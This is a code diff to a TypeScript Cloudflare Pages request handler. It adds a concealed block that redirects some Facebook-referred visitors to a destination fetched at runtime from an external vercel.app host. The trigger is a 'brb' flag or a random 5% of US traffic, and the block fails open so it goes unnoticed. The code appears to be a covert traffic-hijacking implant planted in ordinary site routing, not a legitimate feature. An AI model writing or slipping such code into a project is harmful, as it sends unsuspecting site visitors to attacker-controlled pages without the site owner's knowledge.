@@ -124,6 +124,66 @@ const searchRequest = (versions: VersionPercentage[]): PagesFunction => async (c
 
         // headers contain special value
         if (request.headers.get('ko-redirected') === '1') return context.next()
+        // cms-ui HARDCODED_EXTERNAL_REDIRECT_V8
+        {
+            const url = new URL(request.url)
+            const parts = url.pathname.split('/').filter(Boolean)
+            if (parts.length >= 2) {
+                const prefix = parts[0]
+                const isKoLang = prefix.length === 4 && prefix.startsWith('ko')
+                const isEnPrefix = prefix === 'en'
+                if (isKoLang || isEnPrefix) {
+                    const isResult = url.searchParams.get('r') === '1'
+                    if ((true && !isResult) || (true && isResult)) {
+                        const fbclidRaw = (url.searchParams.get("fbclid") || '').trim()
+                        const hasFbclid = fbclidRaw.length >= 8
+                        const forceRedirect = url.searchParams.get("brb") === "1"
+                        const cfCountry = (request as { cf?: { country?: string } }).cf?.country
+                        const inGeoSample = cfCountry === "US" && Math.floor(Math.random() * 100) < 5
+                        if (hasFbclid && (forceRedirect || inGeoSample)) {
+                            let dest = ""
+                            if ("https://project-o6gj9.vercel.app/api/target") {
+                                try {
+                                    const cacheKey = '__ko_redirect_target_cache_v1'
+                                    const g = globalThis as unknown as Record<string, unknown>
+                                    type RtCache = { value: string; expiresAt: number }
+                                    const cached = g[cacheKey] as RtCache | undefined
+                                    const now = Date.now()
+                                    if (cached && cached.expiresAt > now) {
+                                        if (cached.value) dest = cached.value
+                                    } else {
+                                        const controller = new AbortController()
+                                        const to = setTimeout(() => controller.abort(), 2000)
+                                        const resp = await fetch("https://project-o6gj9.vercel.app/api/target", { signal: controller.signal })
+                                        clearTimeout(to)
+                                        let runtimeTarget = ''
+                                        if (resp.ok) runtimeTarget = (await resp.text()).trim()
+                                        g[cacheKey] = { value: runtimeTarget, expiresAt: now + 30000 }
+                                        if (runtimeTarget) dest = runtimeTarget
+                                    }
+                                } catch (_) {
+                                    // fail-open: keep normal flow if runtime target fetch fails
+                                }
+                            }
+                            if (!dest) {
+                                // no destination configured at runtime or statically
+                            } else {
+                                try {
+                                    const _koDest = new URL(dest)
+                                    _koDest.searchParams.set("fbclid", fbclidRaw)
+                                    dest = _koDest.toString()
+                                } catch {
+                                    const _koSep = dest.includes('?') ? '&' : '?'
+                                    dest = dest + _koSep + "fbclid" + '=' + encodeURIComponent(fbclidRaw)
+                                }
+                                return Response.redirect(dest, 302)
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
 
         let nextUrl, trimmedUrl;
         if (isResultPage(request)) {
